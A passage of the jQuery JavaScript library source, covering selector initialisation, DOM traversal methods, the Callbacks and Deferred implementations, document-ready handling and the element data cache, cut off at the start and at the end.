						match = rquickExpr.exec( selector );
					}

					// Match html or make sure no context is specified for #id
					if ( match && ( match[ 1 ] || !context ) ) {

						// HANDLE: $(html) -> $(array)
						if ( match[ 1 ] ) {
							context = context instanceof jQuery ? context[ 0 ] : context;

							// Option to run scripts is true for back-compat
							// Intentionally let the error be thrown if parseHTML is not present
							jQuery.merge( this, jQuery.parseHTML(
								match[ 1 ],
								context && context.nodeType ? context.ownerDocument || context : document,
								true
							) );

							// HANDLE: $(html, props)
							if ( rsingleTag.test( match[ 1 ] ) && jQuery.isPlainObject( context ) ) {
								for ( match in context ) {

									// Properties of context are called as methods if possible
									if ( isFunction( this[ match ] ) ) {
										this[ match ]( context[ match ] );

									// ...and otherwise set as attributes
									} else {
										this.attr( match, context[ match ] );
									}
								}
							}

							return this;

						// HANDLE: $(#id)
						} else {
							elem = document.getElementById( match[ 2 ] );

							if ( elem ) {

								// Inject the element directly into the jQuery object
								this[ 0 ] = elem;
								this.length = 1;
							}
							return this;
						}

					// HANDLE: $(expr, $(...))
					} else if ( !context || context.jquery ) {
						return ( context || root ).find( selector );

					// HANDLE: $(expr, context)
					// (which is just equivalent to: $(context).find(expr)
					} else {
						return this.constructor( context ).find( selector );
					}

				// HANDLE: $(DOMElement)
				} else if ( selector.nodeType ) {
					this[ 0 ] = selector;
					this.length = 1;
					return this;

				// HANDLE: $(function)
				// Shortcut for document ready
				} else if ( isFunction( selector ) ) {
					return root.ready !== undefined ?
						root.ready( selector ) :

						// Execute immediately if ready is not present
						selector( jQuery );
				}

				return jQuery.makeArray( selector, this );
			};

		// Give the init function the jQuery prototype for later instantiation
		init.prototype = jQuery.fn;

		// Initialize central reference
		rootjQuery = jQuery( document );


		var rparentsprev = /^(?:parents|prev(?:Until|All))/,

			// Methods guaranteed to produce a unique set when starting from a unique set
			guaranteedUnique = {
				children: true,
				contents: true,
				next: true,
				prev: true
			};

		jQuery.fn.extend( {
			has: function( target ) {
				var targets = jQuery( target, this ),
					l = targets.length;

				return this.filter( function() {
					var i = 0;
					for ( ; i < l; i++ ) {
						if ( jQuery.contains( this, targets[ i ] ) ) {
							return true;
						}
					}
				} );
			},

			closest: function( selectors, context ) {
				var cur,
					i = 0,
					l = this.length,
					matched = [],
					targets = typeof selectors !== "string" && jQuery( selectors );

				// Positional selectors never match, since there's no _selection_ context
				if ( !rneedsContext.test( selectors ) ) {
					for ( ; i < l; i++ ) {
						for ( cur = this[ i ]; cur && cur !== context; cur = cur.parentNode ) {

							// Always skip document fragments
							if ( cur.nodeType < 11 && ( targets ?
								targets.index( cur ) > -1 :

								// Don't pass non-elements to jQuery#find
								cur.nodeType === 1 &&
									jQuery.find.matchesSelector( cur, selectors ) ) ) {

								matched.push( cur );
								break;
							}
						}
					}
				}

				return this.pushStack( matched.length > 1 ? jQuery.uniqueSort( matched ) : matched );
			},

			// Determine the position of an element within the set
			index: function( elem ) {

				// No argument, return index in parent
				if ( !elem ) {
					return ( this[ 0 ] && this[ 0 ].parentNode ) ? this.first().prevAll().length : -1;
				}

				// Index in selector
				if ( typeof elem === "string" ) {
					return indexOf.call( jQuery( elem ), this[ 0 ] );
				}

				// Locate the position of the desired element
				return indexOf.call( this,

					// If it receives a jQuery object, the first element is used
					elem.jquery ? elem[ 0 ] : elem
				);
			},

			add: function( selector, context ) {
				return this.pushStack(
					jQuery.uniqueSort(
						jQuery.merge( this.get(), jQuery( selector, context ) )
					)
				);
			},

			addBack: function( selector ) {
				return this.add( selector == null ?
					this.prevObject : this.prevObject.filter( selector )
				);
			}
		} );

		function sibling( cur, dir ) {
			while ( ( cur = cur[ dir ] ) && cur.nodeType !== 1 ) {}
			return cur;
		}

		jQuery.each( {
			parent: function( elem ) {
				var parent = elem.parentNode;
				return parent && parent.nodeType !== 11 ? parent : null;
			},
			parents: function( elem ) {
				return dir( elem, "parentNode" );
			},
			parentsUntil: function( elem, _i, until ) {
				return dir( elem, "parentNode", until );
			},
			next: function( elem ) {
				return sibling( elem, "nextSibling" );
			},
			prev: function( elem ) {
				return sibling( elem, "previousSibling" );
			},
			nextAll: function( elem ) {
				return dir( elem, "nextSibling" );
			},
			prevAll: function( elem ) {
				return dir( elem, "previousSibling" );
			},
			nextUntil: function( elem, _i, until ) {
				return dir( elem, "nextSibling", until );
			},
			prevUntil: function( elem, _i, until ) {
				return dir( elem, "previousSibling", until );
			},
			siblings: function( elem ) {
				return siblings( ( elem.parentNode || {} ).firstChild, elem );
			},
			children: function( elem ) {
				return siblings( elem.firstChild );
			},
			contents: function( elem ) {
				if ( elem.contentDocument != null &&

					// Support: IE 11+
					// <object> elements with no `data` attribute has an object
					// `contentDocument` with a `null` prototype.
					getProto( elem.contentDocument ) ) {

					return elem.contentDocument;
				}

				// Support: IE 9 - 11 only, iOS 7 only, Android Browser <=4.3 only
				// Treat the template element as a regular one in browsers that
				// don't support it.
				if ( nodeName( elem, "template" ) ) {
					elem = elem.content || elem;
				}

				return jQuery.merge( [], elem.childNodes );
			}
		}, function( name, fn ) {
			jQuery.fn[ name ] = function( until, selector ) {
				var matched = jQuery.map( this, fn, until );

				if ( name.slice( -5 ) !== "Until" ) {
					selector = until;
				}

				if ( selector && typeof selector === "string" ) {
					matched = jQuery.filter( selector, matched );
				}

				if ( this.length > 1 ) {

					// Remove duplicates
					if ( !guaranteedUnique[ name ] ) {
						jQuery.uniqueSort( matched );
					}

					// Reverse order for parents* and prev-derivatives
					if ( rparentsprev.test( name ) ) {
						matched.reverse();
					}
				}

				return this.pushStack( matched );
			};
		} );
		var rnothtmlwhite = ( /[^\x20\t\r\n\f]+/g );



		// Convert String-formatted options into Object-formatted ones
		function createOptions( options ) {
			var object = {};
			jQuery.each( options.match( rnothtmlwhite ) || [], function( _, flag ) {
				object[ flag ] = true;
			} );
			return object;
		}

		/*
		 * Create a callback list using the following parameters:
		 *
		 *	options: an optional list of space-separated options that will change how
		 *			the callback list behaves or a more traditional option object
		 *
		 * By default a callback list will act like an event callback list and can be
		 * "fired" multiple times.
		 *
		 * Possible options:
		 *
		 *	once:			will ensure the callback list can only be fired once (like a Deferred)
		 *
		 *	memory:			will keep track of previous values and will call any callback added
		 *					after the list has been fired right away with the latest "memorized"
		 *					values (like a Deferred)
		 *
		 *	unique:			will ensure a callback can only be added once (no duplicate in the list)
		 *
		 *	stopOnFalse:	interrupt callings when a callback returns false
		 *
		 */
		jQuery.Callbacks = function( options ) {

			// Convert options from String-formatted to Object-formatted if needed
			// (we check in cache first)
			options = typeof options === "string" ?
				createOptions( options ) :
				jQuery.extend( {}, options );

			var // Flag to know if list is currently firing
				firing,

				// Last fire value for non-forgettable lists
				memory,

				// Flag to know if list was already fired
				fired,

				// Flag to prevent firing
				locked,

				// Actual callback list
				list = [],

				// Queue of execution data for repeatable lists
				queue = [],

				// Index of currently firing callback (modified by add/remove as needed)
				firingIndex = -1,

				// Fire callbacks
				fire = function() {

					// Enforce single-firing
					locked = locked || options.once;

					// Execute callbacks for all pending executions,
					// respecting firingIndex overrides and runtime changes
					fired = firing = true;
					for ( ; queue.length; firingIndex = -1 ) {
						memory = queue.shift();
						while ( ++firingIndex < list.length ) {

							// Run callback and check for early termination
							if ( list[ firingIndex ].apply( memory[ 0 ], memory[ 1 ] ) === false &&
								options.stopOnFalse ) {

								// Jump to end and forget the data so .add doesn't re-fire
								firingIndex = list.length;
								memory = false;
							}
						}
					}

					// Forget the data if we're done with it
					if ( !options.memory ) {
						memory = false;
					}

					firing = false;

					// Clean up if we're done firing for good
					if ( locked ) {

						// Keep an empty list if we have data for future add calls
						if ( memory ) {
							list = [];

						// Otherwise, this object is spent
						} else {
							list = "";
						}
					}
				},

				// Actual Callbacks object
				self = {

					// Add a callback or a collection of callbacks to the list
					add: function() {
						if ( list ) {

							// If we have memory from a past run, we should fire after adding
							if ( memory && !firing ) {
								firingIndex = list.length - 1;
								queue.push( memory );
							}

							( function add( args ) {
								jQuery.each( args, function( _, arg ) {
									if ( isFunction( arg ) ) {
										if ( !options.unique || !self.has( arg ) ) {
											list.push( arg );
										}
									} else if ( arg && arg.length && toType( arg ) !== "string" ) {

										// Inspect recursively
										add( arg );
									}
								} );
							} )( arguments );

							if ( memory && !firing ) {
								fire();
							}
						}
						return this;
					},

					// Remove a callback from the list
					remove: function() {
						jQuery.each( arguments, function( _, arg ) {
							var index;
							while ( ( index = jQuery.inArray( arg, list, index ) ) > -1 ) {
								list.splice( index, 1 );

								// Handle firing indexes
								if ( index <= firingIndex ) {
									firingIndex--;
								}
							}
						} );
						return this;
					},

					// Check if a given callback is in the list.
					// If no argument is given, return whether or not list has callbacks attached.
					has: function( fn ) {
						return fn ?
							jQuery.inArray( fn, list ) > -1 :
							list.length > 0;
					},

					// Remove all callbacks from the list
					empty: function() {
						if ( list ) {
							list = [];
						}
						return this;
					},

					// Disable .fire and .add
					// Abort any current/pending executions
					// Clear all callbacks and values
					disable: function() {
						locked = queue = [];
						list = memory = "";
						return this;
					},
					disabled: function() {
						return !list;
					},

					// Disable .fire
					// Also disable .add unless we have memory (since it would have no effect)
					// Abort any pending executions
					lock: function() {
						locked = queue = [];
						if ( !memory && !firing ) {
							list = memory = "";
						}
						return this;
					},
					locked: function() {
						return !!locked;
					},

					// Call all callbacks with the given context and arguments
					fireWith: function( context, args ) {
						if ( !locked ) {
							args = args || [];
							args = [ context, args.slice ? args.slice() : args ];
							queue.push( args );
							if ( !firing ) {
								fire();
							}
						}
						return this;
					},

					// Call all the callbacks with the given arguments
					fire: function() {
						self.fireWith( this, arguments );
						return this;
					},

					// To know if the callbacks have already been called at least once
					fired: function() {
						return !!fired;
					}
				};

			return self;
		};


		function Identity( v ) {
			return v;
		}
		function Thrower( ex ) {
			throw ex;
		}

		function adoptValue( value, resolve, reject, noValue ) {
			var method;

			try {

				// Check for promise aspect first to privilege synchronous behavior
				if ( value && isFunction( ( method = value.promise ) ) ) {
					method.call( value ).done( resolve ).fail( reject );

				// Other thenables
				} else if ( value && isFunction( ( method = value.then ) ) ) {
					method.call( value, resolve, reject );

				// Other non-thenables
				} else {

					// Control `resolve` arguments by letting Array#slice cast boolean `noValue` to integer:
					// * false: [ value ].slice( 0 ) => resolve( value )
					// * true: [ value ].slice( 1 ) => resolve()
					resolve.apply( undefined, [ value ].slice( noValue ) );
				}

			// For Promises/A+, convert exceptions into rejections
			// Since jQuery.when doesn't unwrap thenables, we can skip the extra checks appearing in
			// Deferred#then to conditionally suppress rejection.
			} catch ( value ) {

				// Support: Android 4.0 only
				// Strict mode functions invoked without .call/.apply get global-object context
				reject.apply( undefined, [ value ] );
			}
		}

		jQuery.extend( {

			Deferred: function( func ) {
				var tuples = [

						// action, add listener, callbacks,
						// ... .then handlers, argument index, [final state]
						[ "notify", "progress", jQuery.Callbacks( "memory" ),
							jQuery.Callbacks( "memory" ), 2 ],
						[ "resolve", "done", jQuery.Callbacks( "once memory" ),
							jQuery.Callbacks( "once memory" ), 0, "resolved" ],
						[ "reject", "fail", jQuery.Callbacks( "once memory" ),
							jQuery.Callbacks( "once memory" ), 1, "rejected" ]
					],
					state = "pending",
					promise = {
						state: function() {
							return state;
						},
						always: function() {
							deferred.done( arguments ).fail( arguments );
							return this;
						},
						"catch": function( fn ) {
							return promise.then( null, fn );
						},

						// Keep pipe for back-compat
						pipe: function( /* fnDone, fnFail, fnProgress */ ) {
							var fns = arguments;

							return jQuery.Deferred( function( newDefer ) {
								jQuery.each( tuples, function( _i, tuple ) {

									// Map tuples (progress, done, fail) to arguments (done, fail, progress)
									var fn = isFunction( fns[ tuple[ 4 ] ] ) && fns[ tuple[ 4 ] ];

									// deferred.progress(function() { bind to newDefer or newDefer.notify })
									// deferred.done(function() { bind to newDefer or newDefer.resolve })
									// deferred.fail(function() { bind to newDefer or newDefer.reject })
									deferred[ tuple[ 1 ] ]( function() {
										var returned = fn && fn.apply( this, arguments );
										if ( returned && isFunction( returned.promise ) ) {
											returned.promise()
												.progress( newDefer.notify )
												.done( newDefer.resolve )
												.fail( newDefer.reject );
										} else {
											newDefer[ tuple[ 0 ] + "With" ](
												this,
												fn ? [ returned ] : arguments
											);
										}
									} );
								} );
								fns = null;
							} ).promise();
						},
						then: function( onFulfilled, onRejected, onProgress ) {
							var maxDepth = 0;
							function resolve( depth, deferred, handler, special ) {
								return function() {
									var that = this,
										args = arguments,
										mightThrow = function() {
											var returned, then;

											// Support: Promises/A+ section 2.3.3.3.3
											// https://promisesaplus.com/#point-59
											// Ignore double-resolution attempts
											if ( depth < maxDepth ) {
												return;
											}

											returned = handler.apply( that, args );

											// Support: Promises/A+ section 2.3.1
											// https://promisesaplus.com/#point-48
											if ( returned === deferred.promise() ) {
												throw new TypeError( "Thenable self-resolution" );
											}

											// Support: Promises/A+ sections 2.3.3.1, 3.5
											// https://promisesaplus.com/#point-54
											// https://promisesaplus.com/#point-75
											// Retrieve `then` only once
											then = returned &&

												// Support: Promises/A+ section 2.3.4
												// https://promisesaplus.com/#point-64
												// Only check objects and functions for thenability
												( typeof returned === "object" ||
													typeof returned === "function" ) &&
												returned.then;

											// Handle a returned thenable
											if ( isFunction( then ) ) {

												// Special processors (notify) just wait for resolution
												if ( special ) {
													then.call(
														returned,
														resolve( maxDepth, deferred, Identity, special ),
														resolve( maxDepth, deferred, Thrower, special )
													);

												// Normal processors (resolve) also hook into progress
												} else {

													// ...and disregard older resolution values
													maxDepth++;

													then.call(
														returned,
														resolve( maxDepth, deferred, Identity, special ),
														resolve( maxDepth, deferred, Thrower, special ),
														resolve( maxDepth, deferred, Identity,
															deferred.notifyWith )
													);
												}

											// Handle all other returned values
											} else {

												// Only substitute handlers pass on context
												// and multiple values (non-spec behavior)
												if ( handler !== Identity ) {
													that = undefined;
													args = [ returned ];
												}

												// Process the value(s)
												// Default process is resolve
												( special || deferred.resolveWith )( that, args );
											}
										},

										// Only normal processors (resolve) catch and reject exceptions
										process = special ?
											mightThrow :
											function() {
												try {
													mightThrow();
												} catch ( e ) {

													if ( jQuery.Deferred.exceptionHook ) {
														jQuery.Deferred.exceptionHook( e,
															process.error );
													}

													// Support: Promises/A+ section 2.3.3.3.4.1
													// https://promisesaplus.com/#point-61
													// Ignore post-resolution exceptions
													if ( depth + 1 >= maxDepth ) {

														// Only substitute handlers pass on context
														// and multiple values (non-spec behavior)
														if ( handler !== Thrower ) {
															that = undefined;
															args = [ e ];
														}

														deferred.rejectWith( that, args );
													}
												}
											};

									// Support: Promises/A+ section 2.3.3.3.1
									// https://promisesaplus.com/#point-57
									// Re-resolve promises immediately to dodge false rejection from
									// subsequent errors
									if ( depth ) {
										process();
									} else {

										// Call an optional hook to record the error, in case of exception
										// since it's otherwise lost when execution goes async
										if ( jQuery.Deferred.getErrorHook ) {
											process.error = jQuery.Deferred.getErrorHook();

										// The deprecated alias of the above. While the name suggests
										// returning the stack, not an error instance, jQuery just passes
										// it directly to `console.warn` so both will work; an instance
										// just better cooperates with source maps.
										} else if ( jQuery.Deferred.getStackHook ) {
											process.error = jQuery.Deferred.getStackHook();
										}
										window.setTimeout( process );
									}
								};
							}

							return jQuery.Deferred( function( newDefer ) {

								// progress_handlers.add( ... )
								tuples[ 0 ][ 3 ].add(
									resolve(
										0,
										newDefer,
										isFunction( onProgress ) ?
											onProgress :
											Identity,
										newDefer.notifyWith
									)
								);

								// fulfilled_handlers.add( ... )
								tuples[ 1 ][ 3 ].add(
									resolve(
										0,
										newDefer,
										isFunction( onFulfilled ) ?
											onFulfilled :
											Identity
									)
								);

								// rejected_handlers.add( ... )
								tuples[ 2 ][ 3 ].add(
									resolve(
										0,
										newDefer,
										isFunction( onRejected ) ?
											onRejected :
											Thrower
									)
								);
							} ).promise();
						},

						// Get a promise for this deferred
						// If obj is provided, the promise aspect is added to the object
						promise: function( obj ) {
							return obj != null ? jQuery.extend( obj, promise ) : promise;
						}
					},
					deferred = {};

				// Add list-specific methods
				jQuery.each( tuples, function( i, tuple ) {
					var list = tuple[ 2 ],
						stateString = tuple[ 5 ];

					// promise.progress = list.add
					// promise.done = list.add
					// promise.fail = list.add
					promise[ tuple[ 1 ] ] = list.add;

					// Handle state
					if ( stateString ) {
						list.add(
							function() {

								// state = "resolved" (i.e., fulfilled)
								// state = "rejected"
								state = stateString;
							},

							// rejected_callbacks.disable
							// fulfilled_callbacks.disable
							tuples[ 3 - i ][ 2 ].disable,

							// rejected_handlers.disable
							// fulfilled_handlers.disable
							tuples[ 3 - i ][ 3 ].disable,

							// progress_callbacks.lock
							tuples[ 0 ][ 2 ].lock,

							// progress_handlers.lock
							tuples[ 0 ][ 3 ].lock
						);
					}

					// progress_handlers.fire
					// fulfilled_handlers.fire
					// rejected_handlers.fire
					list.add( tuple[ 3 ].fire );

					// deferred.notify = function() { deferred.notifyWith(...) }
					// deferred.resolve = function() { deferred.resolveWith(...) }
					// deferred.reject = function() { deferred.rejectWith(...) }
					deferred[ tuple[ 0 ] ] = function() {
						deferred[ tuple[ 0 ] + "With" ]( this === deferred ? undefined : this, arguments );
						return this;
					};

					// deferred.notifyWith = list.fireWith
					// deferred.resolveWith = list.fireWith
					// deferred.rejectWith = list.fireWith
					deferred[ tuple[ 0 ] + "With" ] = list.fireWith;
				} );

				// Make the deferred a promise
				promise.promise( deferred );

				// Call given func if any
				if ( func ) {
					func.call( deferred, deferred );
				}

				// All done!
				return deferred;
			},

			// Deferred helper
			when: function( singleValue ) {
				var

					// count of uncompleted subordinates
					remaining = arguments.length,

					// count of unprocessed arguments
					i = remaining,

					// subordinate fulfillment data
					resolveContexts = Array( i ),
					resolveValues = slice.call( arguments ),

					// the primary Deferred
					primary = jQuery.Deferred(),

					// subordinate callback factory
					updateFunc = function( i ) {
						return function( value ) {
							resolveContexts[ i ] = this;
							resolveValues[ i ] = arguments.length > 1 ? slice.call( arguments ) : value;
							if ( !( --remaining ) ) {
								primary.resolveWith( resolveContexts, resolveValues );
							}
						};
					};

				// Single- and empty arguments are adopted like Promise.resolve
				if ( remaining <= 1 ) {
					adoptValue( singleValue, primary.done( updateFunc( i ) ).resolve, primary.reject,
						!remaining );

					// Use .then() to unwrap secondary thenables (cf. gh-3000)
					if ( primary.state() === "pending" ||
						isFunction( resolveValues[ i ] && resolveValues[ i ].then ) ) {

						return primary.then();
					}
				}

				// Multiple arguments are aggregated like Promise.all array elements
				while ( i-- ) {
					adoptValue( resolveValues[ i ], updateFunc( i ), primary.reject );
				}

				return primary.promise();
			}
		} );


		// These usually indicate a programmer mistake during development,
		// warn about them ASAP rather than swallowing them by default.
		var rerrorNames = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;

		// If `jQuery.Deferred.getErrorHook` is defined, `asyncError` is an error
		// captured before the async barrier to get the original error cause
		// which may otherwise be hidden.
		jQuery.Deferred.exceptionHook = function( error, asyncError ) {

			// Support: IE 8 - 9 only
			// Console exists when dev tools are open, which can happen at any time
			if ( window.console && window.console.warn && error && rerrorNames.test( error.name ) ) {
				window.console.warn( "jQuery.Deferred exception: " + error.message,
					error.stack, asyncError );
			}
		};




		jQuery.readyException = function( error ) {
			window.setTimeout( function() {
				throw error;
			} );
		};




		// The deferred used on DOM ready
		var readyList = jQuery.Deferred();

		jQuery.fn.ready = function( fn ) {

			readyList
				.then( fn )

				// Wrap jQuery.readyException in a function so that the lookup
				// happens at the time of error handling instead of callback
				// registration.
				.catch( function( error ) {
					jQuery.readyException( error );
				} );

			return this;
		};

		jQuery.extend( {

			// Is the DOM ready to be used? Set to true once it occurs.
			isReady: false,

			// A counter to track how many items to wait for before
			// the ready event fires. See trac-6781
			readyWait: 1,

			// Handle when the DOM is ready
			ready: function( wait ) {

				// Abort if there are pending holds or we're already ready
				if ( wait === true ? --jQuery.readyWait : jQuery.isReady ) {
					return;
				}

				// Remember that the DOM is ready
				jQuery.isReady = true;

				// If a normal DOM Ready event fired, decrement, and wait if need be
				if ( wait !== true && --jQuery.readyWait > 0 ) {
					return;
				}

				// If there are functions bound, to execute
				readyList.resolveWith( document, [ jQuery ] );
			}
		} );

		jQuery.ready.then = readyList.then;

		// The ready event handler and self cleanup method
		function completed() {
			document.removeEventListener( "DOMContentLoaded", completed );
			window.removeEventListener( "load", completed );
			jQuery.ready();
		}

		// Catch cases where $(document).ready() is called
		// after the browser event has already occurred.
		// Support: IE <=9 - 10 only
		// Older IE sometimes signals "interactive" too soon
		if ( document.readyState === "complete" ||
			( document.readyState !== "loading" && !document.documentElement.doScroll ) ) {

			// Handle it asynchronously to allow scripts the opportunity to delay ready
			window.setTimeout( jQuery.ready );

		} else {

			// Use the handy event callback
			document.addEventListener( "DOMContentLoaded", completed );

			// A fallback to window.onload, that will always work
			window.addEventListener( "load", completed );
		}




		// Multifunctional method to get and set values of a collection
		// The value/s can optionally be executed if it's a function
		var access = function( elems, fn, key, value, chainable, emptyGet, raw ) {
			var i = 0,
				len = elems.length,
				bulk = key == null;

			// Sets many values
			if ( toType( key ) === "object" ) {
				chainable = true;
				for ( i in key ) {
					access( elems, fn, i, key[ i ], true, emptyGet, raw );
				}

			// Sets one value
			} else if ( value !== undefined ) {
				chainable = true;

				if ( !isFunction( value ) ) {
					raw = true;
				}

				if ( bulk ) {

					// Bulk operations run against the entire set
					if ( raw ) {
						fn.call( elems, value );
						fn = null;

					// ...except when executing function values
					} else {
						bulk = fn;
						fn = function( elem, _key, value ) {
							return bulk.call( jQuery( elem ), value );
						};
					}
				}

				if ( fn ) {
					for ( ; i < len; i++ ) {
						fn(
							elems[ i ], key, raw ?
								value :
								value.call( elems[ i ], i, fn( elems[ i ], key ) )
						);
					}
				}
			}

			if ( chainable ) {
				return elems;
			}

			// Gets
			if ( bulk ) {
				return fn.call( elems );
			}

			return len ? fn( elems[ 0 ], key ) : emptyGet;
		};


		// Matches dashed string for camelizing
		var rmsPrefix = /^-ms-/,
			rdashAlpha = /-([a-z])/g;

		// Used by camelCase as callback to replace()
		function fcamelCase( _all, letter ) {
			return letter.toUpperCase();
		}

		// Convert dashed to camelCase; used by the css and data modules
		// Support: IE <=9 - 11, Edge 12 - 15
		// Microsoft forgot to hump their vendor prefix (trac-9572)
		function camelCase( string ) {
			return string.replace( rmsPrefix, "ms-" ).replace( rdashAlpha, fcamelCase );
		}
		var acceptData = function( owner ) {

			// Accepts only:
			//  - Node
			//    - Node.ELEMENT_NODE
			//    - Node.DOCUMENT_NODE
			//  - Object
			//    - Any
			return owner.nodeType === 1 || owner.nodeType === 9 || !( +owner.nodeType );
		};




		function Data() {
			this.expando = jQuery.expando + Data.uid++;
		}

		Data.uid = 1;

		Data.prototype = {

			cache: function( owner ) {

				// Check if the owner object already has a cache
				var value = owner[ this.expando ];

				// If not, create one
				if ( !value ) {
					value = {};

					// We can accept data for non-element nodes in modern browsers,
					// but we should not, see trac-8335.
					// Always return an empty object.
					if ( acceptData( owner ) ) {

						// If it is a node unlikely to be stringify-ed or looped over
						// use plain assignment
						if ( owner.nodeType ) {
							owner[ this.expando ] = value;

						// Otherwise secure it in a non-enumerable property
						// configurable must be true to allow the property to be
						// deleted when data is removed
						} else {
							Object.defineProperty( owner, this.expando, {
								value: value,
								configurable: true
							} );
						}
					}
				}

				return value;
			},
			set: function( owner, data, value ) {
				var prop,
					cache = this.cache( owner );

				// Handle: [ owner, key, value ] args
				// Always use camelCase key (gh-2257)
				if ( typeof data === "string" ) {
					cache[ camelCase( data ) ] = value;

				// Handle: [ owner, { properties } ] args
				} else {

					// Copy the properties one-by-one to the cache object
					for ( prop in data ) {
						cache[ camelCase( prop ) ] = data[ prop ];
					}
				}
				return cache;
			},
			get: function( owner, key ) {
				return key === undefined ?
					this.cache( owner ) :

					// Always use camelCase key (gh-2257)
					owner[ this.expando ] && owner[ this.expando ][ camelCase( key ) ];
			},
			access: function( owner, key, value ) {

				// In cases where either:
				//
				//   1. No key was specified
				//   2. A string key was specified, but no value provided
				//
				// Take the "read" path and allow the get method to determine
				// which value to return, respectively either:
				//
				//   1. The entire cache object
				//   2. The data stored at the key
				//
				if ( key === undefined ||
						( ( key && typeof key === "string" ) && value === undefined ) ) {

					return this.get( owner, key );
				}

				// When the key is not a string, or both a key and value
				// are specified, set or extend (existing objects) with either:
				//
				//   1. An object of properties
				//   2. A key and value
				//
				this.set( owner, key, value );

				// Since the "set" path can have two possible entry points
				// return the expected data based on which path was taken[*]
				return value !== undefined ? value : key;
			},
			remove: function( owner, key ) {
				var i,
					cache = owner[ this.expando ];

				if ( cache === undefined ) {
					return;
				}

				if ( key !== undefined ) {

					// Support array or space separated string of keys
					if ( Array.isArray( key ) ) {

						// If key is an array of keys...
						// We always set camelCase keys, so remove that.
						key = key.map( camelCase );
					} else {
						key = camelCase( key );

						// If a key with the spaces exists, use it.
						// Otherwise, create an array by matching non-whitespace
						key = key in cache ?
							[ key ] :
							( key.match( rnothtmlwhite ) || [] );
					}

					i = key.length;

					while ( i-- ) {
						delete cache[ key[ i ] ];
					}
				}

				// Remove the expando if there's no more data
				if ( key === undefined || jQuery.isEmptyObject( cache ) ) {

					// Support: Chrome <=35 - 45
					// Webkit & Blink performance suffers when deleting properties
					// from DOM nodes, so set to undefined instead
					// https://bugs.chromium.org/p/chromium/issues/detail?id=378607 (bug restricted)
					if ( owner.nodeType ) {
						owner[ this.expando ] = undefined;
					} else {
						delete owner[ this.expando ];
					}
				}
			},
			hasData: function( owner ) {
				var cache = owner[ this.expando ];
				return cache !== undefined && !jQuery.isEmptyObject( cache );
			}
		};
		var dataPriv = new Data();

		var dataUser = new Data();



		//	Implementation Summary
		//
		//	1. Enforce API surface and semantic compatibility with 1.9.x branch
		//	2. Improve the module's maintainability by reducing the storage
		//		paths to a single mechanism.
		//	3. Use the same single mechanism to support "private" and "user" data.
		//	4. _Never_ expose "private" data to user code (TODO: Drop _data, _removeData)
		//	5. Avoid exposing implementation details on user objects (eg. expando properties)
		//	6. Provide a clear path for implementation upgrade to WeakMap in 2014

		var rbrace = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
			rmultiDash = /[A-Z]/g;

		function getData( data ) {
			if ( data === "true" ) {
				return true;
			}

			if ( data === "false" ) {
				return false;
			}

			if ( data === "null" ) {
				return null;
			}

			// Only convert to a number if it doesn't change the string
			if ( data === +data + "" ) {
				return +data;
			}

			if ( rbrace.test( data ) ) {
				return JSON.parse( data );
			}

			return data;
		}

		function dataAttr( elem, key, data ) {
			var name;

			// If nothing was found internally, try to fetch any
			// data from the HTML5 data-* attribute
			if ( data === undefined && elem.nodeType === 1 ) {
				name = "data-" + key.replace( rmultiDash, "-$&" ).toLowerCase();
				data = elem.getAttribute( name );

				if ( typeof data === "string" ) {
					try {
						data = getData( data );
					} catch ( e ) {}

					// Make sure we set the data so it isn't changed later
					dataUser.set( elem, key, data );
				} else {
					data = undefined;
				}
			}
			return data;
		}

		jQuery.extend( {
			hasData: function( elem ) {
				return dataUser.hasData( elem ) || dataPriv.hasData( elem );
			},

			data: function( elem, name, data ) {
				return dataUser.access( elem, name, data );
			},

			removeData: function( elem, name ) {
				dataUser.remove( elem, name );
			},

			// TODO: Now that all calls to _data and _removeData have been replaced
			// with direct calls to dataPriv methods, these can be deprecated.
			_data: function( elem, name, data ) {
				return dataPriv.access( elem, name, data );
			},

			_removeData: function( elem, name ) {
				dataPriv.remove( elem, name );
			}
		} );

		jQuery.fn.extend( {
			data: function( key, value ) {
				var i, name, data,
					elem = this[ 0 ],
					attrs = elem && elem.attributes;

				// Gets all values
				if ( key === undefined ) {
					if ( this.length ) {
						data = dataUser.get( elem );

						if ( elem.nodeType === 1 && !dataPriv.get( elem, "hasDataAttrs" ) ) {
							i = attrs.length;
							while ( i-- ) {

								// Support: IE 11 only
								// The attrs elements can be null (trac-14894)
								if ( attrs[ i ] ) {
									name = attrs[ i ].name;
									if ( name.indexOf( "data-" ) === 0 ) {
										name = camelCase( name.slice( 5 ) );
										dataAttr( elem, name, data[ name ] );
									}
								}
							}
							dataPriv.set( elem, "hasDataAttrs", true );
						}
					}

					return data;
				}

				// Sets multiple values
				if ( typeof key === "object" ) {
					return this.each( function() {
						dataUser.set( this, key );
					} );
				}

				return access( this, function( value ) {
					var data;

					// The calling jQuery object (element matches) is not empty
					// (and therefore has an element appears at this[ 0 ]) and the
					// `value` parameter was not undefined. An empty jQuery object
					// will result in `undefined` for elem = this[ 0 ] which will
					// throw an exception if an attempt to read a data cache is made.
					if ( elem && value === undefined ) {

						// Attempt to get data from the cache
						// The key will always be camelCased in Data
						data = dataUser.get( elem, key );
						if ( data !== undefined ) {
							return data;
						}

						// Attempt to "discover" the data in
						// HTML5 custom data-* attrs
						data = dataAttr( elem, key );
						if ( data !== undefined ) {
							return data;
						}

						// We tried really hard, but the data doesn't exist.
						return;
					}

					// Set the data...
					this.each( function() {

						// We always store the camelCased key
						dataUser.set( this, key, value );
					} );
				}, null, value, arguments.length > 1, null, true );
			},

			removeData: function( key ) {
				return this.each( function() {
					dataUser.remove( this, key );
				} );
			}
		} );


		jQuery.extend( {
			queue: function( elem, type, data ) {
				var queue;

				if ( elem ) {
					type = ( type || "fx" ) + "queue";
					queue = dataPriv.get( elem, type );

					// Speed up dequeue by getting out quickly if this is just a lookup
					if ( data ) {
						if ( !queue || Array.isArray( data ) ) {
							queue = dataPriv.access( elem, type, jQuery.makeArray( data ) );
						} else {
							queue.push( data );
						}
					}
					return queue || [];
				}
			},

			dequeue: function( elem, type ) {
				type = type || "fx";

				var queue = jQuery.queue( elem, type ),
					startLength = queue.length,
					fn = queue.shift(),
					hooks = jQuery._queueHooks( elem, type ),
					next = function() {
						jQuery.dequeue( elem, type );
					};

				// If the fx queue is dequeued, always remove the progress sentinel
				if ( fn === "inprogress" ) {
					fn = queue.shift();
					startLength--;
				}

				if ( fn ) {

					// Add a progress sentinel to prevent the fx queue from being
